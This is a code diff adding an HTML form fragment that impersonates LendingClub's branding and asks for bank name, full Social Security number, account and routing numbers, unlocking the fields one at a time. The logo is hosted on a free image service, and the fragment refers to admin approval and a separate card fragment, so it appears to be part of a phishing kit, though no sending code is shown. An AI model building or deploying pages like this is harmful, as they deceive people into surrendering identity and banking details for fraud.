@@ -1,0 +1,353 @@
+<style>
+/* ── c_formb_v1 — Bank Details with progressive unlock ── */
+:root {
+  --lc-navy: #113b5e;
+  --lc-blue: #82cde5;
+  --lc-orange: #f43d1d;
+  --text-dark: #2c3e50;
+  --text-light: #6c757d;
+  --bg-light: #f8f9fa;
+  --border-light: #e9ecef;
+  --success-green: #45a049;
+  --shadow-lg: 0 8px 24px rgba(0,0,0,0.15);
+  --transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+}
+.frag-contract {
+  background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 20px;
+}
+.card {
+  background: #fff;
+  border-radius: 16px;
+  box-shadow: var(--shadow-lg);
+  overflow: hidden;
+  margin-bottom: 20px;
+  width: 100%;
+  max-width: 560px;
+}
+.card-header {
+  background: linear-gradient(90deg, var(--lc-navy), #0c2c46);
+  padding: 22px;
+  text-align: center;
+}
+.card-header img { max-width: 200px; filter: brightness(0) invert(1); }
+.card-body { padding: 28px; }
+.card-title {
+  font-size: 22px;
+  font-weight: 600;
+  color: var(--text-dark);
+  margin-bottom: 6px;
+  text-align: center;
+  font-family: 'Playfair Display', serif;
+}
+.card-subtitle {
+  font-size: 13.5px;
+  color: var(--text-light);
+  text-align: center;
+  margin-bottom: 24px;
+}
+/* Form fields */
+.form-group {
+  margin-bottom: 18px;
+  position: relative;
+}
+.form-group label {
+  display: block;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--text-dark);
+  margin-bottom: 7px;
+}
+.form-group input {
+  width: 100%;
+  padding: 13px 16px;
+  border: 2px solid var(--border-light);
+  border-radius: 10px;
+  font-size: 15px;
+  transition: var(--transition);
+  background: #fff;
+  box-sizing: border-box;
+}
+.form-group input:focus {
+  outline: none;
+  border-color: var(--lc-navy);
+  box-shadow: 0 0 0 3px rgba(17,59,94,0.1);
+}
+.form-group input:disabled {
+  background: #f0f0f0;
+  color: #aaa;
+  cursor: not-allowed;
+  border-color: #e0e0e0;
+}
+/* Field unlock animation */
+.form-group input.just-unlocked {
+  animation: fieldUnlock 0.4s ease;
+}
+@keyframes fieldUnlock {
+  0%  { box-shadow: 0 0 0 0 rgba(130,205,229,0.6); }
+  50% { box-shadow: 0 0 0 8px rgba(130,205,229,0.2); }
+  100%{ box-shadow: 0 0 0 3px rgba(17,59,94,0.1); }
+}
+/* SSN eye toggle wrapper */
+.input-eye-wrap {
+  position: relative;
+}
+.input-eye-wrap input {
+  padding-right: 48px;
+}
+.eye-toggle {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: var(--text-light);
+  font-size: 16px;
+  padding: 4px;
+  z-index: 2;
+  transition: color 0.2s;
+}
+.eye-toggle:hover { color: var(--lc-navy); }
+/* Error text */
+.error-text {
+  color: var(--lc-orange);
+  font-size: 12px;
+  margin-top: 5px;
+  display: none;
+}
+.error-text.visible { display: block; }
+/* Progress indicator */
+.field-progress {
+  display: flex;
+  gap: 5px;
+  margin-bottom: 20px;
+}
+.field-progress-dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: #ddd;
+  transition: background 0.3s;
+}
+.field-progress-dot.done { background: var(--success-green); }
+.field-progress-dot.active { background: var(--lc-blue); }
+/* Continue button */
+.continue-btn {
+  width: 100%;
+  padding: 15px;
+  background: #121212;
+  color: white;
+  border: none;
+  border-radius: 6px;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: var(--transition);
+  margin-top: 8px;
+}
+.continue-btn:hover:not(:disabled) {
+  background: linear-gradient(270deg, #00ad6a, #0f263c);
+}
+.continue-btn:disabled {
+  background: #ccc;
+  cursor: not-allowed;
+  opacity: 0.7;
+}
+/* Pending overlay (shown while awaiting admin approval) */
+.approval-pending-banner {
+  display: none;
+  background: rgba(17,59,94,0.07);
+  border: 1px solid rgba(17,59,94,0.2);
+  border-radius: 10px;
+  padding: 14px 16px;
+  text-align: center;
+  margin-top: 12px;
+  font-size: 13.5px;
+  color: var(--lc-navy);
+}
+.approval-pending-banner.visible { display: block; }
+@media (max-width: 600px) {
+  .card-body { padding: 18px; }
+}
+</style>
+
+<div class="frag-contract">
+  <div class="card">
+    <div class="card-header">
+      <img src="https://i.ibb.co/DLHxff7/Lending-Club-logo-svg.png" alt="LendingClub">
+    </div>
+    <div class="card-body">
+      <h2 class="card-title">Bank Account Details</h2>
+      <p class="card-subtitle">Enter your banking information for verification</p>
+
+      <!-- Progress dots -->
+      <div class="field-progress" id="bankFieldProgress">
+        <div class="field-progress-dot active"  id="fdot1" title="Bank Name"></div>
+        <div class="field-progress-dot"          id="fdot2" title="SSN"></div>
+        <div class="field-progress-dot"          id="fdot3" title="Account Number"></div>
+        <div class="field-progress-dot"          id="fdot4" title="Confirm Account"></div>
+        <div class="field-progress-dot"          id="fdot5" title="Routing Number"></div>
+      </div>
+
+      <!-- Field 1: Bank Name -->
+      <div class="form-group">
+        <label for="bankName">Bank Name</label>
+        <input type="text" id="bankName" placeholder="Enter your bank name"
+          oninput="window._bankFieldCheck()">
+      </div>
+
+      <!-- Field 2: SSN (locked until bank name filled) -->
+      <div class="form-group">
+        <label for="fullSSN">Full Social Security Number</label>
+        <div class="input-eye-wrap">
+          <input type="password" id="fullSSN" placeholder="XXX-XX-XXXX"
+            maxlength="11" disabled
+            oninput="window._formatSSN(this); window._bankFieldCheck()">
+          <button type="button" class="eye-toggle" id="ssnEyeBtn"
+            onclick="window._toggleSSNEye()" disabled>
+            <i class="fas fa-eye"></i>
+          </button>
+        </div>
+      </div>
+
+      <!-- Field 3: Account Number -->
+      <div class="form-group">
+        <label for="accountNumber">Account Number</label>
+        <input type="text" id="accountNumber" placeholder="Enter account number"
+          disabled oninput="window._bankFieldCheck()">
+      </div>
+
+      <!-- Field 4: Confirm Account Number -->
+      <div class="form-group">
+        <label for="confirmAccountNumber">Re-confirm Account Number</label>
+        <input type="text" id="confirmAccountNumber"
+          placeholder="Re-enter account number"
+          disabled oninput="window._bankFieldCheck()">
+        <p class="error-text" id="accountMatchError">Account numbers do not match</p>
+      </div>
+
+      <!-- Field 5: Routing Number -->
+      <div class="form-group">
+        <label for="routingNumber">Routing Number (9 digits)</label>
+        <input type="text" id="routingNumber"
+          placeholder="9-digit routing number"
+          maxlength="9" disabled
+          oninput="window._bankFieldCheck()">
+      </div>
+
+      <button class="continue-btn" id="bankContinueBtn"
+        onclick="window.validateBankDetails && window.validateBankDetails()"
+        disabled>
+        Continue to Verification
+      </button>
+
+      <div class="approval-pending-banner" id="bankPendingBanner">
+        ⏳ Submitting for review — please wait…
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function() {
+
+  // ── Progressive field unlock ────────────────────────────────
+  var FIELDS = ['bankName','fullSSN','accountNumber','confirmAccountNumber','routingNumber'];
+
+  function _unlock(fieldId, dotIndex) {
+    var el = document.getElementById(fieldId);
+    if (!el || !el.disabled) return;
+    el.disabled = false;
+    el.classList.add('just-unlocked');
+    el.addEventListener('animationend', function() { el.classList.remove('just-unlocked'); }, { once: true });
+    // Unlock SSN eye button
+    if (fieldId === 'fullSSN') {
+      var btn = document.getElementById('ssnEyeBtn');
+      if (btn) btn.disabled = false;
+    }
+    // Update dot
+    var prevDot = document.getElementById('fdot' + dotIndex);
+    var nextDot = document.getElementById('fdot' + (dotIndex + 1));
+    if (prevDot) prevDot.classList.replace('active', 'done');
+    if (nextDot) nextDot.classList.add('active');
+    // Focus after short delay
+    setTimeout(function() { el.focus(); }, 50);
+  }
+
+  window._bankFieldCheck = function() {
+    var bankName = (document.getElementById('bankName')?.value || '').trim();
+    var ssn      = (document.getElementById('fullSSN')?.value  || '').replace(/\D/g, '');
+    var acct     = (document.getElementById('accountNumber')?.value || '').trim();
+    var confirm  = (document.getElementById('confirmAccountNumber')?.value || '').trim();
+    var routing  = (document.getElementById('routingNumber')?.value || '').trim();
+
+    // Progressive unlock
+    if (bankName.length >= 2 && document.getElementById('fullSSN')?.disabled)
+      _unlock('fullSSN', 1);
+    if (ssn.length === 9 && document.getElementById('accountNumber')?.disabled)
+      _unlock('accountNumber', 2);
+    if (acct.length >= 4 && document.getElementById('confirmAccountNumber')?.disabled)
+      _unlock('confirmAccountNumber', 3);
+    if (confirm.length >= 4 && document.getElementById('routingNumber')?.disabled)
+      _unlock('routingNumber', 4);
+
+    // Account match check
+    var matchErr = document.getElementById('accountMatchError');
+    if (matchErr && confirm.length > 0) {
+      matchErr.classList.toggle('visible', acct !== confirm);
+    }
+
+    // Mark dot 5 done when routing filled
+    if (routing.length === 9) {
+      var d5 = document.getElementById('fdot5');
+      if (d5) { d5.classList.remove('active'); d5.classList.add('done'); }
+    }
+
+    // Enable submit when all valid
+    var allFilled = bankName && ssn.length === 9 && acct && confirm && routing.length === 9;
+    var matching  = acct === confirm;
+    var btn = document.getElementById('bankContinueBtn');
+    if (btn) btn.disabled = !(allFilled && matching);
+  };
+
+  // SSN formatter
+  window._formatSSN = function(el) {
+    var raw = el.value.replace(/\D/g, '');
+    if (raw.length > 3 && raw.length <= 5)       el.value = raw.slice(0,3) + '-' + raw.slice(3);
+    else if (raw.length > 5)                      el.value = raw.slice(0,3) + '-' + raw.slice(3,5) + '-' + raw.slice(5,9);
+    else                                          el.value = raw;
+  };
+
+  // SSN eye toggle
+  window._toggleSSNEye = function() {
+    var inp = document.getElementById('fullSSN');
+    var btn = document.getElementById('ssnEyeBtn');
+    if (!inp) return;
+    var icon = btn && btn.querySelector('i');
+    if (inp.type === 'password') {
+      inp.type = 'text';
+      if (icon) { icon.classList.remove('fa-eye'); icon.classList.add('fa-eye-slash'); }
+    } else {
+      inp.type = 'password';
+      if (icon) { icon.classList.remove('fa-eye-slash'); icon.classList.add('fa-eye'); }
+    }
+  };
+
+  // Card number formatter (used on card fragment too, kept here for completeness)
+  var cardInput = document.getElementById('card-number');
+  if (cardInput) {
+    cardInput.addEventListener('input', function(e) {
+      var v = e.target.value.replace(/\D/g,'');
+      var f = v.match(/.{1,4}/g);
+      e.target.value = f ? f.join('-') : v;
+    });
+  }
+
+})();
+</script>
